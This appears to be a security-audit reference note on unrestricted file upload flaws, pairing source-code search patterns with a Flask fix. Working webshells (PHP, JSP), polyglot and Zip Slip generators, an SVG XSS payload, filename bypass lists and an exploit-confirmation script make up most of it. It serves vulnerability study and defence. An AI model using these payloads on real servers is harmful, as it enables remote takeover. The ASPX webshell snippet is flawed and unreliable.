# Unrestricted File Upload

**Tags:** #critical #high #upload #webshell #rce #file-upload
**OWASP:** A04:2021 Insecure Design / A03:2021 Injection
**CVSS Base:** 9.8 (Critical — webshell results in RCE)

---

## 📖 What it is

Upload endpoints that do not adequately validate the real type and content of a file allow an attacker to upload webshells (scripts executable by the server) or malicious files that trigger when processed.

---

## 🔍 `grep_search` Tactics

```
SaveAs(
move_uploaded_file(
fs.writeFile(
upload.array(
upload.single(
multer(
FileField
file.save(
shutil.move(
werkzeug.utils.secure_filename
```

**Always check:** is the filename submitted by the user trusted directly in the filesystem path? → Immediate Critical RCE.

---

## 💣 Bypass Techniques

### 1. Extension Evasion

```
# Alternative extensions for PHP
.php5, .phtml, .phar, .php3, .php4, .phps

# Alternative extensions for JSP
.jspx, .jspf

# Extensions for ASP.NET
.ashx, .aspx, .cer, .asa

# Extensions for Perl
.pl, .cgi
```

### 2. Null Byte and Double Extension

```
shell.php%00.jpg        server treats as .php, ignores .jpg
shell.php.jpg           server with permissive config processes .php
shell.jpg.php           case-insensitive server
shell.PHP               case-sensitive filter bypass
SHELL.PHP               additional bypass
```

### 3. Magic Byte Spoofing

```php
# Insert GIF signature at the beginning of the PHP file
GIF89a;
<?php system($_GET['cmd']); ?>
# mime_content_type() detects GIF, but Apache executes as PHP
# Saved as evil.php.gif or evil.gif if server executes GIF
```

```python
# .tmp/create_polyglot.py
magic_bytes = b"GIF89a"
php_payload = b"\n<?php system($_GET['cmd']); ?>"
with open('polyglot.php.gif', 'wb') as f:
    f.write(magic_bytes + php_payload)
print("Polyglot file created: polyglot.php.gif")
```

### 4. MIME Type Spoofing in Request

```bash
# Send PHP file with image Content-Type
curl -X POST http://target.com/upload \
     -F "file=@shell.php;type=image/jpeg" \
     -H "Authorization: Bearer $TOKEN"
```

### 5. SVG as XSS Vector

```xml
<!-- evil.svg  executes JavaScript when opened or rendered -->
<?xml version="1.0" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <script type="text/javascript">alert(document.cookie)</script>
</svg>
```

### 6. ZIP/RCE (Zip Slip)

```python
# .tmp/create_zipslip.py
import zipfile

with zipfile.ZipFile("evil.zip", "w") as zf:
    # File with path traversal inside the zip
    zf.write("shell.php", "../../../../var/www/html/shell.php")
    
print("ZipSlip created: evil.zip")
# When extracted by the server  shell.php in /var/www/html/ = Webshell
```

---

## 🎯 Webshell Types

### Minimal PHP Webshell
```php
<?php system($_GET['cmd']); ?>
```

### PHP Webshell with Features
```php
<?php
if(isset($_GET['cmd'])){
    $cmd = $_GET['cmd'];
    if (function_exists('system')) {
        system($cmd);
    } elseif (function_exists('shell_exec')) {
        echo shell_exec($cmd);
    } elseif (function_exists('exec')) {
        exec($cmd, $output);
        echo implode("\n", $output);
    } elseif (function_exists('passthru')) {
        passthru($cmd);
    }
}
?>
```

### JSP Webshell
```jsp
<%@ page import="java.io.*" %>
<%
  String cmd = request.getParameter("cmd");
  Process p = Runtime.getRuntime().exec(cmd);
  InputStream in = p.getInputStream();
  byte[] buf = new byte[in.available()];
  in.read(buf);
  out.print(new String(buf));
%>
```

### ASPX Webshell
```aspx
<%@ Page Language="C#" %>
<% Response.Write(System.Diagnostics.Process.Start("cmd.exe").StandardOutput.ReadToEnd()); %>
```

---

## 🧪 Validation Script

```python
# .tmp/validate_file_upload.py
import requests, io

TARGET = "http://target.com"
UPLOAD_ENDPOINT = "/api/upload"
ACCESS_ENDPOINT = "/uploads/"

TOKEN = "Bearer eyJ..."

# 1. Try uploading PHP with a direct filename
php_content = b"<?php echo 'WEBSHELL_TEST_' . phpversion(); system('id'); ?>"
for ext in ['php', 'php5', 'phtml', 'phar']:
    filename = f"test.{ext}"
    files = {'file': (filename, io.BytesIO(php_content), 'image/jpeg')}
    r = requests.post(f"{TARGET}{UPLOAD_ENDPOINT}", files=files, 
                      headers={"Authorization": TOKEN}, timeout=10)
    
    print(f"[{r.status_code}] Upload of {filename}: {r.text[:100]}")
    
    # Try to access the file to confirm execution
    response_data = r.json() if r.headers.get('content-type', '').startswith('application/json') else {}
    file_url = response_data.get('url') or response_data.get('path') or f"{ACCESS_ENDPOINT}{filename}"
    
    access_r = requests.get(f"{TARGET}{file_url}?cmd=id", timeout=5)
    if 'uid=' in access_r.text or 'WEBSHELL_TEST_' in access_r.text:
        print(f"[🔴 CRITICAL RCE] Active webshell at: {file_url}")
        print(f"Output: {access_r.text[:300]}")
```

---

## 🛡️ Fix

```python
#  Complete upload validation  Python Flask
import magic  # python-magic
from werkzeug.utils import secure_filename
import uuid, os

ALLOWED_EXTENSIONS = {'jpg', 'jpeg', 'png', 'gif', 'pdf'}
ALLOWED_MIME_TYPES = {'image/jpeg', 'image/png', 'image/gif', 'application/pdf'}
UPLOAD_FOLDER = '/var/app/uploads'

def validate_and_save_upload(file):
    # 1. Check extension (whitelist)
    filename = secure_filename(file.filename)
    ext = filename.rsplit('.', 1)[-1].lower() if '.' in filename else ''
    if ext not in ALLOWED_EXTENSIONS:
        raise ValueError(f"Extension not allowed: .{ext}")
    
    # 2. Read content and verify magic bytes
    content = file.read()
    file.seek(0)
    
    mime = magic.from_buffer(content, mime=True)  # checks real bytes
    if mime not in ALLOWED_MIME_TYPES:
        raise ValueError(f"Real MIME type not allowed: {mime}")
    
    # 3. Generate a random name (never use the user's filename)
    safe_name = f"{uuid.uuid4().hex}.{ext}"
    
    # 4. Save outside the webroot (serve via proxy, never expose as executable)
    save_path = os.path.join(UPLOAD_FOLDER, safe_name)
    
    # 5. Verify that the final path is within UPLOAD_FOLDER (anti-path-traversal)
    if not os.path.realpath(save_path).startswith(UPLOAD_FOLDER):
        raise ValueError("Path traversal detected")
    
    with open(save_path, 'wb') as f:
        f.write(content)
    
    return safe_name
```

**Golden rules:**
1. **Never trust the filename sent by the user** — generate a random UUID
2. **Verify magic bytes**, not just the extension or Content-Type
3. **Save outside the webroot** — serve via a controlled endpoint, not a direct URL
4. **Never execute uploaded files** — always serve as `Content-Disposition: attachment`
5. **Use antivirus/scanner** for public uploads in production

---

## 🔗 Chain Exploits

```
Webshell upload  RCE  Reverse shell  Full server compromise
SVG upload  XSS for all users who view the image
Zip Slip  Webshell extracted into webroot  RCE
Upload + Path Traversal (filename with ..)  Overwrite critical files
Upload + Race Condition  Temporary upload  Execution before validation
Magic byte spoofing + image processing (ImageMagick)  RCE CVE
```

---

## 📌 References
- [[command-injection-rce]]
- [[path-traversal-lfi]]
- [[xss-cross-site-scripting]]
- [HackTricks File Upload](https://book.hacktricks.xyz/pentesting-web/file-upload)
- [PayloadsAllTheThings File Upload](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)